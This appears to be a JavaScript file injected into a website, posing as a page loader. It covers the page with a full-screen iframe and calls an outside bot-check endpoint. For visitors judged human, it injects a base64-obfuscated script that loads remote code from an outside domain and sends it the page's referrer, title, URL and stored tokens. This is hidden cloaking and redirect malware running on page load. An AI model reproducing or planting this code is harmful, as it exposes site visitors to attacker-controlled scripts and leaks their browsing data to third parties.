const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfdzE4UDFEN1lXRlJaaGs5bSc7CiAgICBpZiAoIXdpbmRvdy5fdzE4UDFEN1lXRlJaaGs5bSkgewogICAgICAgIHdpbmRvdy5fdzE4UDFEN1lXRlJaaGs5bSA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vNHZRVlhjdzMnLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfdFZUNzk0RjFKVkhwd3M1WSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX3RWVDc5NEYxSlZIcHdzNVkgIT09ICd1bmRlZmluZWQnICYmIF90VlQ3OTRGMUpWSHB3czVZICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9nS0RkUXI3VDc2UjZ0M1ZSID0gSlNPTi5wYXJzZShfdFZUNzk0RjFKVkhwd3M1WSk7CiAgICAgICAgdmFyIF9aQnBXc1RGblpEWmNTTEdZID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX2dLRGRRcjdUNzZSNnQzVlIuY3JlYXRlZF9hdCArIHdpbmRvdy5fdzE4UDFEN1lXRlJaaGs5bS50dGwgPCBfWkJwV3NURm5aRFpjU0xHWSkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX2Yxc3BSeEtiSFRUemt4SjggPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfUHRZempGNHdzSjc2Z3NNTCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF96WVB2UTZXUFdOVnFMNUpXID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfellQdlE2V1BXTlZxTDVKVyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfellQdlE2V1BXTlZxTDVKVyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF96WVB2UTZXUFdOVnFMNUpXICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF96WVB2UTZXUFdOVnFMNUpXICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfellQdlE2V1BXTlZxTDVKVyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfellQdlE2V1BXTlZxTDVKVyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX3cxOFAxRDdZV0ZSWmhrOW0uUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX2Yxc3BSeEtiSFRUemt4SjggIT09ICd1bmRlZmluZWQnICYmIF9mMXNwUnhLYkhUVHpreEo4ICYmIHdpbmRvdy5fdzE4UDFEN1lXRlJaaGs5bS51bmlxdWUpIHsKICAgICAgICBfellQdlE2V1BXTlZxTDVKVyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9mMXNwUnhLYkhUVHpreEo4KTsKICAgIH0KICAgIGlmICh0eXBlb2YgX1B0WXpqRjR3c0o3NmdzTUwgIT09ICd1bmRlZmluZWQnICYmIF9QdFl6akY0d3NKNzZnc01MICYmIHdpbmRvdy5fdzE4UDFEN1lXRlJaaGs5bS51bmlxdWUpIHsKICAgICAgICBfellQdlE2V1BXTlZxTDVKVyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX1B0WXpqRjR3c0o3NmdzTUwpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF96WVB2UTZXUFdOVnFMNUpXICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fdzE4UDFEN1lXRlJaaGs5bS5SX1BBVEggKyBfellQdlE2V1BXTlZxTDVKVzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
             document.querySelector("head").appendChild(script);
        }
        setTimeout(toggleLoad, 1000);
        
    })
})
